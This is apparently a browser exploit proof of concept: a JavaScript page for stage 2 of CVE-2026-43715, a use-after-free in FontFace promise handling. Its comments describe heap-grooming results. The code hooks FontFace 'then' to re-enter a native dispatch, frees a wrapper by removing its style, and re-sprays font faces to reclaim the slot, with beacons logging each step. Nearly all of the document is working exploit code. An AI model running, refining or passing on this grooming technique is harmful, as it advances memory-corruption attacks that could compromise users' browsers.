// p453 — CVE-2026-43715 Stage 2: second-order escalation — free the
// replacement wrapper inside the confused dispatch
// Beacon prefix: V453-
//
// p452: 28/28 runs, the confused fontLoaded(*this) resolves exactly one
// sprayed face's loaded promise (~position 30). The flip's promise
// resolution passes the FontFace object itself, so its thenable check
// re-enters our getter (THEN-2) with `this` = the confused-callback
// target — synchronous inside the C++ dispatch.
//
// p453 acts there: remove the flipped face's style + force layout (free
// the replacement wrapper while the C++ fontLoaded frame still sits on
// it), then re-spray failing-src faces to occupy the slot before
// returning. Outcomes:
//   - crash after THEN-2  -> dangling dispatch on the deeper slot; the
//     re-spray failed to land in time -> tune counts/sizes
//   - survive + a t2* face flips later -> second-order groom works; the
//     slot is aimable at will
//   - survive + nothing   -> wrapper outlives the style removal
//     (refcount held elsewhere) -> lifetime study next

(function() {
  function B(tag) {
    try { new Image().src = '/BEACON?V453-' + tag + '&t=' + Date.now(); } catch(e) {}
  }

  B('BOOT');

  window.onerror = function(msg) {
    B('ONERROR-' + encodeURIComponent(String(msg)).slice(0, 80));
    return false;
  };

  var OK = 'local(Helvetica)';
  var BAD = 'local(Songti)';
  var hits = 0;
  var styles = {};                     // family -> style element

  function spray(prefix) {
    for (var k = 0; k < 120; k++) {
      var fam = prefix + 'x' + k;
      var st = document.createElement('style');
      st.textContent = '@font-face { font-family: ' + fam +
        '; src: ' + BAD + '; }';
      document.head.appendChild(st);
      styles[fam] = st;
      var d = document.createElement('div');
      d.style.fontFamily = fam;
      d.textContent = 'A';
      document.body.appendChild(d);
      document.body.offsetHeight;
    }
  }

  Object.defineProperty(FontFace.prototype, 'then', {
    get: function() {
      hits++;
      if (hits <= 3) B('THEN-' + hits);
      if (hits === 1) {
        var v = document.getElementById('v');
        if (v) {
          v.remove();
          document.body.offsetHeight;      // free happens here
          spray('t1');
        }
      } else if (hits === 2) {
        // `this` = the wrapper the confused callback just flipped
        var fam = String(this.family).replace(/['"]/g, '');
        B('T2-' + fam + '-S' + this.status);
        var st = styles[fam];
        if (st) {
          st.remove();
          document.body.offsetHeight;      // free the replacement
          B('T2-FREED');
          spray('t2');                      // occupy the slot again
          B('T2-RESPRAYED');
        } else {
          B('T2-NOSTYLE');
        }
      }
      return undefined;
    },
    configurable: true
  });
  B('GETTER-SET');

  function findFace(fam) {
    var found = null;
    document.fonts.forEach(function(f) {
      if (f.family.replace(/['"]/g, '') === fam) found = f;
    });
    return found;
  }

  function round0() {
    var victim = document.createElement('style');
    victim.id = 'v';
    victim.textContent = 'x{}';
    document.head.appendChild(victim);

    var fs = document.createElement('style');
    fs.textContent = '@font-face { font-family: g0; src: ' + OK + '; }';
    document.head.appendChild(fs);
    document.body.offsetHeight;

    var face = findFace('g0');
    if (!face) { B('NOFACE'); return; }

    void face.loaded;
    B('LOAD-0');

    face.load().then(
      function() { B('SURVIVED-0-H' + hits); },
      function(e) { B('NO-0-' + encodeURIComponent(String(e)).slice(0, 60)); }
    );
  }

  // Census both spray generations after the dust settles: statuses, plus
  // .loaded hooks on t2 faces to catch any second-order flip live.
  setTimeout(function() {
    var s1 = { unloaded: 0, loaded: 0, error: 0, gone: 0 };
    var s2 = { unloaded: 0, loaded: 0, error: 0, gone: 0 };
    var hooked = 0;
    document.fonts.forEach(function(f) {
      var fam = f.family.replace(/['"]/g, '');
      var m = /^t([12])x/.exec(fam);
      if (!m) return;
      var box = m[1] === '1' ? s1 : s2;
      box[f.status] = (box[f.status] || 0) + 1;
      if (m[1] === '2') {
        hooked++;
        (function(face, fm) {
          face.loaded.then(
            function() { B('FLIP2-' + fm + '-S' + face.status); },
            function() { B('REJ2-' + fm); }
          );
        })(f, fam);
      }
    });
    B('CEN1-U' + s1.unloaded + 'L' + s1.loaded + 'E' + s1.error +
      'G' + s1.gone + '-CEN2-U' + s2.unloaded + 'L' + s2.loaded +
      'E' + s2.error + 'G' + s2.gone + '-H' + hooked);
    B('ALIVE-3S-H' + hits);
  }, 3000);

  round0();
})();
